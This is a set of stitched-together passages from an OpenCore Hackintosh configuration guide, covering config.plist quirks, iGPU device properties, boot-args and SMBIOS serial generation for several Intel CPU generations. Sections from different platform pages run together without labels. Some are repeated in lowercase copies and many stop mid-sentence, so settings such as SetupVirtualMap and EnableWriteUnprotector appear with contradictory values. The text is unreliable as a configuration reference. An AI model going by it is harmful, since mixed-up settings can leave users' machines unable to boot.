passthrough to macOS that are generally ignored, for us we can ignore this section.\n\n\n# Quirks\n\nInfo\n\nSettings relating to boot.efi patching and firmware fixes, for us, we need to change the following:\n\nQUIRK                    ENABLED   COMMENT\nDevirtualiseMmio         YES       \nEnableWriteUnprotector   NO        \nProtectUefiServices      YES       \nRebuildAppleMemoryMap    YES       \nResizeAppleGpuBars       -1        If your firmware supports increasing GPU Bar sizes (ie\n                                   Resizable BAR Support), set this to 0\nSetupVirtualMap          NO        \nSyncRuntimePermissions   YES       \n\nMore in-depth Info\n * AvoidRuntimeDefrag: YES\n   * Fixes UEFI runtime services like date, time, NVRAM, power control, etc.\n * DevirtualiseMmio: YES\n   * Reduces Stolen Memory Footprint, expands options for slide=N values and very helpful with fixing Memory Allocation issues , requires ProtectUefiServices as well for Z490.\n * EnableSafeModeSlide: YES\n   * Enables slide variables to be used in safe mode.\n * EnableWriteUnprotector: NO\n   * This quirk and RebuildAppleMemoryMap can commonly conflict, recommended to enable the latter on newer platforms and disable this entry.\n   * However, due to issues with OEMs not using the latest EDKII builds you may find that the above combo will result in early boot failures. This is due to missing the MEMORY_ATTRIBUTE_TABLE and such we recommend disabling RebuildAppleMemoryMap and enabling EnableWriteUnprotector. More info on this is covered in the troubleshooting section.\n * ProtectUefiServices: YES\n   * Protects UEFI services from being overridden by the firmware, required for Z490.\n * ProvideCustomSlide: YES\n   * Used for Slide variable calculation. However the necessity of this quirk is determined by OCABC: Only N/256 slide values are usable! message in the debug log. If the message OCABC: All slides are usable! You can disable ProvideCustomSlide! is present in your log, you can disable ProvideCustomSlide.\n * RebuildAppleMemoryMap: YES\n   * Generates Memory Map compatible with macOS, can break on some laptop OEM firmwares so if you receive early boot failures disable this.\n * ResizeAppleGpuBars: -1\n   * Will reduce the size of GPU PCI Bars if set to 0 when booting macOS, set to -1 to disable\n   * Setting other PCI Bar values is possible with this quirk, though can cause instabilities\n   * This quirk being set to zero is only necessary if Resizable BAR Support is enabled in your firmware.\n * SetupVirtualMap: NO\n   * Fixes SetVirtualAddresses calls to virtual addresses, however broken due to Comet Lake's memory protections. ASUS, Gigabyte and AsRock boards will not boot with this on.\n * SyncRuntimePermissions: YES\n   * Fixes alignment with MAT tables and required to boot Windows and Linux with MAT tables, also recommended for macOS. Mainly relevant for RebuildAppleMemoryMap users.\n\n\n# DeviceProperties\n\n\n\n\n# Add\n\nSets device properties from a map.\n\nPciRoot(0x0)/Pci(0x2,0x0)\n\nThis section is set up via WhateverGreen's Framebuffer Patching Guide and is used for setting important iGPU properties. If you have a -F series CPU, you can ignore this section as you do not have an iGPU.\n\nThe config.plist doesn't already have a section for this so you will have to create it manually.\n\nAAPL,ig-platform-id is what macOS uses to determine how the iGPU drivers interact with our system, and two values choose between are as follows:\n\nAAPL,IG-PLATFORM-ID   COMMENT\n07009B3E              Used when the Desktop iGPU is used to drive a display\n00009B3E              Alternative to 07009B3E if it doesn't work\n0300C89B              Used when the Desktop iGPU is only used for computing tasks\n                      and doesn't drive a display\n\n * Note: With macOS 10.15.5 and newer, there seems to be a lot of issues with black screen using 07009B3E, if you get similar issues try swapping to 00009B3E\n\nWe also add 2 more properties, framebuffer-patch-enable and framebuffer-stolenmem. The first enables patching via WhateverGreen.kext, and the second sets the min stolen memory to 19MB. This is usually unnecessary, as this can be configured in BIOS(64MB recommended) but required when not available.\n\n * Note: Headless framebuffers(where the dGPU is the display out) do not need framebuffer-patch-enable and framebuffer-stolenmem\n\nKEY                        TYPE   VALUE\nAAPL,ig-platform-id        Data   07009B3E\nframebuffer-patch-enable   Data   01000000\nframebuffer-stolenmem      Data   00003001\n\n(This is an example for a desktop UHD 630 without a dGPU and no BIOS options for iGPU memory)\n\nPciRoot(0x0)/Pci(0x1C,0x1)/Pci(0x0,0x0)\n\nThis entry relates to Intel's I225-V 2.5GBe controller found on higher end Comet Lake boards, what we'll be doing here is tricking Apple's I225LM driver into supporting our I225-V network controller:\n\nKEY         TYPE   VALUE\ndevice-id   Data   F2150000\n\n * Note: If your board didn't ship with the Intel I225 NIC, there's no reason to add this entry.\n * Note 2: If you get a kernel panic on the AppleIntelI210Ethernet kext, your Ethernet's path is likely PciRoot(0x0)/Pci(0x1C,0x4)/Pci(0x0,0x0)\n\nPciRoot(0x0)/Pci(0x1b,0x0)\n\nlayout-id\n\n * Applies AppleALC audio injection, you'll need to do your own research on which codec your motherboard has and match it with AppleALC's layout.

It's invaluable\n              to any Hackintosher, as it gives you an inside look at the\n              boot process, and can help you identify issues, problem\n              kexts, etc.\ndebug=0x100   This disables macOS's watchdog which helps prevents a reboot\n              on a kernel panic. That way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    This is a companion setting to debug=0x100 that tells the OS\n              to also print the symbols on a kernel panic. That can give\n              some more helpful insight as to what's causing the panic\n              itself.\nalcid=1       Used for setting layout-id for AppleALC, see supported\n              codecs to figure out which layout to use for your specific\n              system.

However, it is required on\n            Gigabyte and several other boards, which can only use the\n            kext driver, as the DEXT driver causes hangs.\n            You don't need this if your board didn't ship with the\n            I225-V NIC.\n            \n            On macOS 12.2.1 and below, use dk.e1000=0 instead\n\n * GPU-Specific boot-args:\n\nBOOT-ARGS        DESCRIPTION\nagdpmod=pikera   Used for disabling board ID checks on some Navi GPUs (RX\n                 5000 & 6000 series), without this you'll get a black screen.\n                 Don't use if you don't have Navi (ie.

It is generally recommended to change this with csrutil via the recovery partition.\n   * csr-active-config by default is set to 00000000 which enables System Integrity Protection. You can choose a number of different values but overall we recommend keeping this enabled for best security practices. More info can be found in our troubleshooting page: Disabling SIP\n\n * run-efi-updater: No\n   \n   * This is used to prevent Apple's firmware update packages from installing and breaking boot order; this is important as these firmware updates (meant for Macs) will not work.\n\n * prev-lang:kbd: <>\n   \n   * Needed for non-latin keyboards in the format of lang-COUNTRY:keyboard, recommended to keep blank though you can specify it(Default in Sample config is Russian):\n   * American: en-US:0(656e2d55533a30 in HEX)\n   * Full list can be found in AppleKeyboardLayouts.txt\n   * Hint: prev-lang:kbd can be changed into a String so you can input en-US:0 directly instead of converting to HEX\n   * Hint 2: prev-lang:kbd can be set to a blank variable (eg. <>) which will force the Language Picker to appear instead at first boot up.\n\nKEY             TYPE     VALUE\nprev-lang:kbd   String   en-US:0\n\n\n# Delete\n\nInfo\n\nForcibly rewrites NVRAM variables, do note that Add will not overwrite values already present in NVRAM so values like boot-args should be left alone.

There are two main SMBIOS used for Comet Lake:\n\nSMBIOS     HARDWARE\niMac20,1   i7-10700K and lower(ie. 8 core and lower)\niMac20,2   i9-10850K and higher(ie. 10 core)\n\nRun GenSMBIOS, pick option 1 for downloading MacSerial and Option 3 for selecting out SMBIOS. This will give us an output similar to the following:\n\n  #######################################################\n #               iMac20,1 SMBIOS Info                  #\n#######################################################\n\nType:         iMac20,1\nSerial:       C02XG0FDH7JY\nBoard Serial: C02839303QXH69FJA\nSmUUID:       DBB364D6-44B2-4A02-B922-AB4396F16DA8\n\n\n * Note: MacSerial currently does not support Linux, so you must grab a Windows or macOS machine to generate the values\n\nThe Type part gets copied to Generic -> SystemProductName.\n\nThe Serial part gets copied to Generic -> SystemSerialNumber.\n\nThe Board Serial part gets copied to Generic -> MLB.\n\nThe SmUUID part gets copied to Generic -> SystemUUID.\n\nWe set Generic -> ROM to either an Apple ROM (dumped from a real Mac), your NIC MAC address, or any random MAC address (could be just 6 random bytes, for this guide we'll use 11223300 0000. After install follow the Fixing iServices page on how to find your real MAC Address)\n\nReminder that you need an invalid serial! When inputting your serial number in Apple's Check Coverage Page, you should get a message such as \"Unable to check coverage for this serial number.\"\n\nAutomatic: YES\n\n * Generates PlatformInfo based on Generic section instead of DataHub, NVRAM, and SMBIOS sections\n\n\n# Generic\n\nMore in-depth Info\n\n * AdviseFeatures: NO\n   \n   * Used for when the EFI partition isn't first on the Windows drive\n\n * MaxBIOSVersion: NO\n   \n   * Sets BIOS version to Max to avoid firmware updates in Big Sur+, mainly applicable for genuine Macs.\n\n * ProcessorType: 0\n   \n   * Set to 0 for automatic type detection, however this value can be overridden if desired.

Use at your own risk\n\n\n# UEFI\n\n\n\nConnectDrivers: YES\n\n * Forces .efi drivers, change to NO will automatically connect added UEFI drivers. This can make booting slightly faster, but not all drivers connect themselves. E.g. certain file system drivers may not load.\n\n\n# Drivers\n\nAdd your .efi drivers here.\n\nOnly drivers present here should be:\n\n * HfsPlus.efi\n * OpenRuntime.efi\n\nMore in-depth Info\n\nKEY         TYPE      DESCRIPTION\nPath        String    Path of the file from OC/Drivers directory\nLoadEarly   Boolean   Load the driver early before NVRAM setup, should only be\n                      enabled for OpenRuntime.efi and OpenVariableRuntimeDxe.efi\n                      if using legacy NVRAM\nArguments   String    Some drivers accept additional arguments which are specified\n                      here.\n\n\n# APFS\n\nBy default, OpenCore only loads APFS drivers from macOS Big Sur and newer. If you are booting macOS Catalina or earlier, you may need to set a new minimum version/date. Not setting this can result in OpenCore not finding your macOS partition!\n\nmacOS Sierra and earlier use HFS instead of APFS. You can skip this section if booting older versions of macOS.\n\nAPFS Versions\n\nBoth MinVersion and MinDate need to be set if changing the minimum version.\n\nMACOS VERSION           MIN VERSION        MIN DATE\nHigh Sierra (10.13.6)   748077008000000    20180621\nMojave (10.14.6)        945275007000000    20190820\nCatalina (10.15.4)      1412101001000000   20200306\nNo restriction          -1                 -1\n\n\n# Audio\n\nRelated to AudioDxe settings, for us we'll be ignoring(leave as default).

kernel(ie. 10.4 and 10.5) we recommend to set this to auto and let macos decide based on your smbios. see below table for supported values:\n     * 10.4-10.5 — x86_64, i386 or i386-user32\n       * i386-user32 refers 32-bit userspace, so 32-bit cpus must use this(or cpus missing ssse3)\n       * x86_64 will still have a 32-bit kernelspace however will ensure 64-bit userspace in 10.4/5\n     * 10.6 — i386, i386-user32, or x86_64\n     * 10.7 — i386 or x86_64\n     * 10.8 or newer — x86_64\n\n * kernelcache: auto\n   \n   * set kernel cache type, mainly useful for debugging and so we

chose the imac20,1 smbios - this is done intentionally for compatibility's sake. there are two main smbios used for comet lake:\n\nsmbios     hardware\nimac20,1   i7-10700k and lower(ie. 8 core and lower)\nimac20,2   i9-10850k and higher(ie. 10 core)\n\nrun gensmbios, pick option 1 for downloading macserial and option 3 for selecting out smbios. this will give us an output similar to the following:\n\n  #######################################################\n #               imac20,1 smbios info                  #\n#######################################################\n\ntype:

it's not. It just takes some time but this guide will tell you how to configure everything, you won't be left in the cold. This also means if you have issues, review your config settings to make sure they're correct. Main things to note with OpenCore:\n\n * All properties must be defined, there are no default OpenCore will fall back on so do not delete sections unless told explicitly so. If the guide doesn't mention the option, leave it at default.\n * The Sample.plist cannot be used As-Is, you must configure it to your system\n * DO NOT USE CONFIGURATORS, these rarely respect OpenCore's configuration and even some like Mackie's will add Clover properties and corrupt plists!\n\nNow with all that, a quick reminder of the tools we need\n\n * ProperTree\n   * Universal plist editor\n * GenSMBIOS\n   * For generating our SMBIOS data\n * Sample/config.plist\n   * See previous section on how to obtain: config.plist Setup\n\nWARNING\n\nRead this guide more than once before setting up OpenCore and make sure you have it set up correctly. Do note that images will not always be the most up-to-date so please read the text below them, if nothing's mentioned then leave as default.\n\n\n# ACPI\n\n\n\n\n# Add\n\nInfo\n\nThis is where you'll add SSDTs for your system, these are very important to booting macOS and have many uses like USB maps, disabling unsupported GPUs and such. And with our system, it's even required to boot. Guide on making them found here: Getting started with ACPI\n\nFor us we'll need a couple of SSDTs to bring back functionality that Clover provided:\n\nREQUIRED SSDTS   DESCRIPTION\nSSDT-PLUG        Allows for native CPU power management on Haswell and newer,\n                 see Getting Started With ACPI Guide for more details.\nSSDT-EC-USBX     Fixes both the embedded controller and USB power, see\n                 Getting Started With ACPI Guide for more details.\n\nNote that you should not add your generated DSDT.aml here, it is already in your firmware. So if present, remove the entry for it in your config.plist and under EFI/OC/ACPI.\n\nFor those wanting a deeper dive into dumping your DSDT, how to make these SSDTs, and compiling them, please see the Getting started with ACPI page. Compiled SSDTs have a .aml extension(Assembled) and will go into the EFI/OC/ACPI folder and must be specified in your config under ACPI -> Add as well.\n\n\n# Delete\n\nThis blocks certain ACPI tables from loading, for us we can ignore this.\n\n\n# Patch\n\nThis section allows us to dynamically modify parts of the ACPI (DSDT, SSDT, etc.) via OpenCore. For us, our patches are handled by our SSDTs. This is a much cleaner solution as this will allow us to boot Windows and other OSes with OpenCore\n\n\n# Quirks\n\nSettings relating to ACPI, leave everything here as default as we have no use for these quirks.\n\n\n# Booter\n\n\n\nThis section is dedicated to quirks relating to boot.efi patching with OpenRuntime, the replacement for AptioMemoryFix.efi\n\n\n# MmioWhitelist\n\nThis section is allowing spaces to be passthrough to macOS that are generally ignored, useful when paired with DevirtualiseMmio\n\n\n# Quirks\n\nInfo\n\nSettings relating to boot.efi patching and firmware fixes, for us, we leave it as default\n\nMore in-depth Info\n * AvoidRuntimeDefrag: YES\n   * Fixes UEFI runtime services like date, time, NVRAM, power control, etc.\n * EnableSafeModeSlide: YES\n   * Enables slide variables to be used in safe mode.\n * EnableWriteUnprotector: YES\n   * Needed to remove write protection from CR0 register.\n * ProvideCustomSlide: YES\n   * Used for Slide variable calculation. However the necessity of this quirk is determined by OCABC: Only N/256 slide values are usable! message in the debug log. If the message OCABC: All slides are usable! You can disable ProvideCustomSlide! is present in your log, you can disable ProvideCustomSlide.\n * SetupVirtualMap: YES\n   * Fixes SetVirtualAddresses calls to virtual addresses, required for Gigabyte boards to resolve early kernel panics.\n\n\n# DeviceProperties\n\n\n\n\n# Add\n\nSets device properties from a map.\n\nPciRoot(0x0)/Pci(0x2,0x0)\n\nThis section is set up via WhateverGreen's Framebuffer Patching Guide and is used for setting important iGPU properties.\n\nThe config.plist doesn't already have a section for this so you will have to create it manually.\n\nAAPL,ig-platform-id is what macOS uses to determine how the iGPU drivers interact with our system, and the two values choose between are as follows:\n\nAAPL,IG-PLATFORM-ID   COMMENT\n00001259              Used when the Desktop iGPU is used to drive a display\n03001259              Used when the Desktop iGPU is only used for computing tasks\n                      and doesn't drive a display\n\nWe also add 2 more properties, framebuffer-patch-enable and framebuffer-stolenmem. The first enables patching via WhateverGreen.kext, and the second sets the min stolen memory to 19MB. This is usually unnecessary, as this can be configured in BIOS(64MB recommended) but required when not available.\n\n * Note: Headless framebuffers(where the dGPU is the display out) do not need framebuffer-patch-enable and framebuffer-stolenmem\n\nKEY                        TYPE   VALUE\nAAPL,ig-platform-id        Data   00001259\nframebuffer-patch-enable   Data   01000000\nframebuffer-stolenmem      Data   00003001\n\n(This is an example for a desktop HD 630 without a dGPU and no BIOS options for iGPU memory)\n\nPciRoot(0x0)/Pci(0x1b,0x0)\n\nlayout-id\n\n * Applies AppleALC audio injection, you'll need to do your own research on which codec your motherboard has and match it with AppleALC's layout. AppleALC Supported Codecs.\n * You can delete this property outright as it's unused for us at this time\n\nFor us, we'll be using the boot-arg alcid=xxx instead to accomplish this. alcid will override all other layout-IDs present. More info on this is covered in the Post-Install Page\n\n\n# Delete\n\nRemoves device properties from the map, for us we can ignore this\n\nFun Fact: The reason the byte order is swapped is because most modern processors are Little Endian\n\n\n# Kernel\n\n\n\n\n# Add\n\nHere's where we specify which kexts to load, in what specific order to load, and what architectures each kext is meant for. By default we recommend leaving what ProperTree has done, however for 32-bit CPUs please see below:\n\nMore in-depth Info\n\nThe main thing you need to keep in mind is:\n\n * Load order\n   * Remember that any plugins should load after its dependencies\n   * This means kexts like Lilu must come before VirtualSMC, AppleALC, WhateverGreen, etc\n\nA reminder that ProperTree users can run Cmd/Ctrl + Shift + R to add all their kexts in the correct order without manually typing each kext out.\n\n * Arch\n   * Architectures supported by this kext\n   * Currently supported values are Any, i386 (32-bit), and x86_64 (64-bit)\n * BundlePath\n   * Name of the kext\n   * ex: Lilu.kext\n * Enabled\n   * Self-explanatory, either enables or disables the kext\n * ExecutablePath\n   * Path to the actual executable is hidden within the kext, you can see what path your kext has by right-clicking and selecting Show Package Contents.

It's invaluable\n              to any Hackintosher, as it gives you an inside look at the\n              boot process, and can help you identify issues, problem\n              kexts, etc.\ndebug=0x100   This disables macOS's watchdog which helps prevents a reboot\n              on a kernel panic. That way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    This is a companion setting to debug=0x100 that tells the OS\n              to also print the symbols on a kernel panic.

section for this so you will have to create it manually.\n\naapl,ig-platform-id is what macos uses to determine how the igpu drivers interact with our system, and the two values choose between are as follows:\n\naapl,ig-platform-id   comment\n00001259              used when the desktop igpu is used to drive a display\n03001259              used when the desktop igpu is only used for computing tasks\n                      and doesn't drive a display\n\nwe also add 2 more properties, framebuffer-patch-enable and framebuffer-stolenmem. the first enables patching via whatevergreen.kext, and the second sets the min stolen memory to 19mb. this is usually unnecessary, as this can be configured in bios(64mb recommended) but required when not available.\n\n * note: headless framebuffers(where the dgpu is the display out) do not need framebuffer-patch-enable and framebuffer-stolenmem\n\nkey                        type   value\naapl,ig-platform-id        data

applealc supported codecs.\n * you can delete this property outright as it's unused for us at this time\n\nfor us, we'll be using the boot-arg alcid=xxx instead to accomplish this. alcid will override all other layout-ids present. more info on this is covered in the post-install page\n\n\n# delete\n\nremoves device properties from the map, for us we can ignore this\n\nfun fact: the reason the byte

each kext is meant for. by default we recommend leaving what propertree has done, however for 32-bit cpus please see below:\n\nmore in-depth info\n\nthe main thing you need to keep in mind is:\n\n * load order\n   * remember that any plugins should load after its dependencies\n   * this means kexts like lilu must come before virtualsmc, applealc, whatevergreen, etc\n\na reminder that propertree users can run cmd/ctrl + shift + r to add all their kexts in the correct order without manually typing each kext out.\n\n * arch\n   * architectures supported by this kext\n   * currently supported

skip however for those planning to boot legacy oses you can see below:\n\nmore in-depth info\n\n * fuzzymatch: true\n   \n   * used for ignoring checksums with kernelcache, instead opting for the latest cache available. can help improve boot performance on many machines in 10.6\n\n * kernelarch: x86_64\n   \n   * set the kernel's arch type, you can choose between auto, i386 (32-bit), and x86_64 (64-bit).\n   * if you're booting older oses which require a 32-bit kernel(ie. 10.4 and 10.5) we recommend to set this to auto and let macos decide based on your smbios. see below table for supported values:\n     * 10.4-10.5 — x86_64, i386 or i386-user32\n       * i386-user32 refers 32-bit userspace, so 32-bit cpus must use this(or cpus missing ssse3)\n       * x86_64 will still have a 32-bit kernelspace however will ensure 64-bit userspace in 10.4/5\n     * 10.6 — i386, i386-user32, or x86_64\n     * 10.7 — i386 or x86_64\n     * 10.8 or newer — x86_64\n\n * kernelcache: auto\n

shows all the\n              behind-the-scenes text that scrolls by as you're booting\n              instead of the apple logo and progress bar. it's invaluable\n              to any hackintosher, as it gives you an inside look at the\n              boot process, and can help you identify issues, problem\n              kexts, etc.\ndebug=0x100   this disables macos's watchdog which helps prevents a reboot\n              on a kernel panic. that way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    this is a companion setting to debug=0x100 that tells the os\n              to also print the symbols on a kernel panic. that can give\n              some more helpful insight as to what's causing the panic\n              itself.\nalcid=1       used for setting layout-id for applealc, see supported\n              codecs to figure out which layout to use for your specific\n              system. more info on

change this with csrutil via the recovery partition.\n   * csr-active-config by default is set to 00000000 which enables system integrity protection. you can choose a number of different values but overall we recommend keeping this enabled for best security practices. more info can be found in our troubleshooting page: disabling sip\n\n * run-efi-updater: no\n   \n   * this is used to prevent

corpnewt's gensmbios application.\n\nfor this kaby lake example, we'll chose the imac18,1 smbios - this is done intentionally for compatibility's sake. there are two main smbios used for kaby lake:\n\nsmbios     hardware\nimac18,1   used for computers utilizing the igpu for displaying\nimac18,3   used for computers using a dgpu for displaying, and an igpu\n           for computing tasks only\n\nrun gensmbios, pick option 1 for downloading macserial and option 3 for selecting out smbios. this will give us an output similar to the following:\n\n

macOS 10.13.6 High Sierra\nNote                            iGPU support will not be covered in this guide, see here:\n                                GMA Patching\nNote 2                          SSE4 is required to boot macOS 10.12, Sierra and newer, so\n                                Conroe and older are unsupported\n\n\n# Starting Point\n\nSo making a config.plist may seem hard, it's not. It just takes some time but this guide will tell you how to configure everything, you won't be left in the cold. This also means if you have issues, review your config settings to make sure they're correct. Main things to note with OpenCore:\n\n * All properties must be defined, there are no default OpenCore will fall back on so do not delete sections unless told explicitly so. If the guide doesn't mention the option, leave it at default.\n * The Sample.plist cannot be used As-Is, you must configure it to your system\n * DO NOT USE CONFIGURATORS, these rarely respect OpenCore's configuration and even some like Mackie's will add Clover properties and corrupt plists!\n\nNow with all that, a quick reminder of the tools we need\n\n * ProperTree\n   * Universal plist editor\n * GenSMBIOS\n   * For generating our SMBIOS data\n * Sample/config.plist\n   * See previous section on how to obtain: config.plist Setup\n\nWARNING\n\nRead this guide more than once before setting up OpenCore and make sure you have it set up correctly. Do note that images will not always be the most up-to-date so please read the text below them, if nothing's mentioned then leave as default.\n\n\n# ACPI\n\n\n\n\n# Add\n\nInfo\n\nThis is where you'll add SSDTs for your system, these are very important to booting macOS and have many uses like USB maps, disabling unsupported GPUs and such. And with our system, it's even required to boot. Guide on making them found here: Getting started with ACPI\n\nFor us we'll need a couple of SSDTs to bring back functionality that Clover provided:\n\nREQUIRED SSDTS   DESCRIPTION\nSSDT-EC          Fixes the embedded controller, see Getting Started With ACPI\n                 Guide for more details.\n\nNote that you should not add your generated DSDT.aml here, it is already in your firmware. So if present, remove the entry for it in your config.plist and under EFI/OC/ACPI.\n\nFor those wanting a deeper dive into dumping your DSDT, how to make these SSDTs, and compiling them, please see the Getting started with ACPI page. Compiled SSDTs have a .aml extension(Assembled) and will go into the EFI/OC/ACPI folder and must be specified in your config under ACPI -> Add as well.\n\n\n# Delete\n\nThis blocks certain ACPI tables from loading, for us we can ignore this.\n\n\n# Patch\n\nThis section allows us to dynamically modify parts of the ACPI (DSDT, SSDT, etc.) via OpenCore. For us, our patches are handled by our SSDTs. This is a much cleaner solution as this will allow us to boot Windows and other OSes with OpenCore\n\n\n# Quirks\n\nSettings relating to ACPI, leave everything here as default as we have no use for these quirks.\n\n\n# Booter\n\nLEGACY   UEFI\n         \n\nThis section is dedicated to quirks relating to boot.efi patching with OpenRuntime, the replacement for AptioMemoryFix.efi\n\n\n# MmioWhitelist\n\nThis section is allowing spaces to be passthrough to macOS that are generally ignored, useful when paired with DevirtualiseMmio\n\n\n# Quirks\n\nInfo\n\nSettings relating to boot.efi patching and firmware fixes, depending where your board has UEFI, you have 2 options depending what your motherboard supports:\n\n# Legacy Settings\n\nQUIRK                    ENABLED   COMMENT\nAvoidRuntimeDefrag       No        Big Sur may require this quirk enabled\nEnableSafeModeSlide      No        \nEnableWriteUnprotector   No        \nProvideCustomSlide       No        \nRebuildAppleMemoryMap    Yes       This is required to boot OS X 10.4 through 10.6\nSetupVirtualMap          No        \n\n# UEFI Settings\n\nQUIRK                   ENABLED   COMMENT\nRebuildAppleMemoryMap   Yes       This is required to boot OS X 10.4 through 10.6\n\nMore in-depth Info\n * AvoidRuntimeDefrag: NO\n   * Fixes UEFI runtime services like date, time, NVRAM, power control;\n   * macOS Big Sur however requires the APIC table present, otherwise causing early kernel panics so this quirk is recommended for those users.\n * EnableSafeModeSlide: YES\n   * Enables slide variables to be used in safe mode.\n * EnableWriteUnprotector: NO\n   * Needed to remove write protection from CR0 register on UEFI platforms.\n * ProvideCustomSlide: YES\n   * Used for Slide variable calculation. However the necessity of this quirk is determined by OCABC: Only N/256 slide values are usable! message in the debug log. If the message OCABC: All slides are usable!

It's invaluable\n              to any Hackintosher, as it gives you an inside look at the\n              boot process, and can help you identify issues, problem\n              kexts, etc.\ndebug=0x100   This disables macOS's watchdog which helps prevents a reboot\n              on a kernel panic. That way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    This is a companion setting to debug=0x100 that tells the OS\n              to also print the symbols on a kernel panic. That can give\n              some more helpful insight as to what's causing the panic\n              itself.\nalcid=1       Used for setting layout-id for AppleALC, see supported\n              codecs to figure out which layout to use for your specific\n              system.

There are 4 main SMBIOS used for legacy hardware:\n\nSMBIOS      HARDWARE                      OS SUPPORT\niMac4,1     Yonah SMBIOS(32-bit)          10.4 to 10.6.8\niMac7,1     Conroe SMBIOS(64-Bit, SSE3)   10.4 to 10.11.6\niMac10,1    Penryn SMBIOS(64-Bit, SSE4)   10.6 to 10.13.6\nMacPro6,1   Mojave and newer SMBIOS       10.9 to current\n\n * If you plan to later run macOS 10.14, Mojave or newer, MacPro6,1 will be the recommended SMBIOS. However please note you will need telemetrap.kext to resolve install issues\n\nRun GenSMBIOS, pick option 1 for downloading MacSerial and Option 3 for selecting out SMBIOS. This will give us an output similar to the following:\n\n  #######################################################\n #               iMac10,1 SMBIOS Info                  #\n#######################################################\n\nType:         iMac10,1\nSerial:       C02KCYZLDNCW\nBoard Serial: C02309301QXF2FRJC\nSmUUID:       A154B586-874B-4E57-A1FF-9D6E503E4580\n\n\nThe Type part gets copied to Generic -> SystemProductName.\n\nThe Serial part gets copied to Generic -> SystemSerialNumber.\n\nThe Board Serial part gets copied to Generic -> MLB.\n\nThe SmUUID part gets copied to Generic -> SystemUUID.\n\nWe set Generic -> ROM to either an Apple ROM (dumped from a real Mac), your NIC MAC address, or any random MAC address (could be just 6 random bytes, for this guide we'll use 11223300 0000. After install follow the Fixing iServices page on how to find your real MAC Address)\n\nReminder that you need an invalid serial! When inputting your serial number in Apple's Check Coverage Page, you should get a message such as \"Unable to check coverage for this serial number.\"\n\nAutomatic: YES\n\n * Generates PlatformInfo based on Generic section instead of DataHub, NVRAM, and SMBIOS sections\n\n\n# Generic\n\nMore in-depth Info\n\n * AdviseFeatures: NO\n   \n   * Used for when the EFI partition isn't first on the Windows drive\n\n * MaxBIOSVersion: NO\n   \n   * Sets BIOS version to Max to avoid firmware updates in Big Sur+, mainly applicable for genuine Macs.\n\n * ProcessorType: 0\n   \n   * Set to 0 for automatic type detection, however this value can be overridden if desired.

Use at your own risk\n\n\n# UEFI\n\n\n\nConnectDrivers: YES\n\n * Forces .efi drivers, change to NO will automatically connect added UEFI drivers. This can make booting slightly faster, but not all drivers connect themselves. E.g. certain file system drivers may not load.\n\n\n# Drivers\n\nAdd your .efi drivers here.\n\nOnly drivers present here should be:\n\n * HfsPlusLegacy.efi\n * OpenRuntime.efi\n * OpenUsbKbDxe.efi(If your firmware does not support UEFI)\n\nMore in-depth Info\n\nKEY         TYPE      DESCRIPTION\nPath        String    Path of the file from OC/Drivers directory\nLoadEarly   Boolean   Load the driver early before NVRAM setup, should only be\n                      enabled for OpenRuntime.efi and OpenVariableRuntimeDxe.efi\n                      if using legacy NVRAM\nArguments   String    Some drivers accept additional arguments which are specified\n                      here.\n\n\n# APFS\n\nBy default, OpenCore only loads APFS drivers from macOS Big Sur and newer. If you are booting macOS Catalina or earlier, you may need to set a new minimum version/date. Not setting this can result in OpenCore not finding your macOS partition!\n\nmacOS Sierra and earlier use HFS instead of APFS. You can skip this section if booting older versions of macOS.\n\nAPFS Versions\n\nBoth MinVersion and MinDate need to be set if changing the minimum version.\n\nMACOS VERSION           MIN VERSION        MIN DATE\nHigh Sierra (10.13.6)   748077008000000    20180621\nMojave (10.14.6)        945275007000000    20190820\nCatalina (10.15.4)      1412101001000000   20200306\nNo restriction          -1                 -1\n\n\n# Audio\n\nRelated to AudioDxe settings, for us we'll be ignoring(leave as default).

many machines in 10.6\n\n * kernelarch: x86_64\n   \n   * set the kernel's arch type, you can choose between auto, i386 (32-bit), and x86_64 (64-bit).\n   * if you're booting older oses which require a 32-bit kernel(ie. 10.4 and 10.5) we recommend to set this to auto and let macos decide based on your smbios. see below table for supported values:\n     * 10.4-10.5 — x86_64, i386 or i386-user32\n       * i386-user32 refers 32-bit userspace, so 32-bit cpus must use this(or cpus missing ssse3)\n       * x86_64 will still have a 32-bit kernelspace however will ensure 64-bit userspace in 10.4/5\n     * 10.6 — i386, i386-user32, or x86_64\n     * 10.7 — i386 or x86_64\n     * 10.8 or newer — x86_64\n\n * kernelcache: auto\n   \n   * set kernel cache type, mainly useful for debugging and so we

          For Ventura information, see macOS 13 Ventura\nNote 2                  Sandy Bridge's iGPU is only officially supported up-to macOS\n                        10.13\nNote 3                  Most Sandy bridge boards do not support UEFI\n\n\n# Starting Point\n\nSo making a config.plist may seem hard, it's not. It just takes some time but this guide will tell you how to configure everything, you won't be left in the cold. This also means if you have issues, review your config settings to make sure they're correct. Main things to note with OpenCore:\n\n * All properties must be defined, there are no default OpenCore will fall back on so do not delete sections unless told explicitly so. If the guide doesn't mention the option, leave it at default.\n * The Sample.plist cannot be used As-Is, you must configure it to your system\n * DO NOT USE CONFIGURATORS, these rarely respect OpenCore's configuration and even some like Mackie's will add Clover properties and corrupt plists!\n\nNow with all that, a quick reminder of the tools we need\n\n * ProperTree\n   * Universal plist editor\n * GenSMBIOS\n   * For generating our SMBIOS data\n * Sample/config.plist\n   * See previous section on how to obtain: config.plist Setup\n\nWARNING\n\nRead this guide more than once before setting up OpenCore and make sure you have it set up correctly. Do note that images will not always be the most up-to-date so please read the text below them, if nothing's mentioned then leave as default.\n\n\n# ACPI\n\n\n\n\n# Add\n\nInfo\n\nThis is where you'll add SSDTs for your system, these are very important to booting macOS and have many uses like USB maps, disabling unsupported GPUs and such. And with our system, it's even required to boot. Guide on making them found here: Getting started with ACPI\n\nFor us we'll need a couple of SSDTs to bring back functionality that Clover provided:\n\nREQUIRED SSDTS   DESCRIPTION\nSSDT-PM          Needed for proper CPU power management, you will need to run\n                 Pike's ssdtPRGen.sh script to generate this file. This will\n                 be run in post install.\nSSDT-EC          Fixes the embedded controller, see Getting Started With ACPI\n                 Guide for more details.\nSSDT-IMEI        Needed to add a missing IMEI device on Sandy Bridge CPU with\n                 7 series motherboards\n\nNote that you should not add your generated DSDT.aml here, it is already in your firmware. So if present, remove the entry 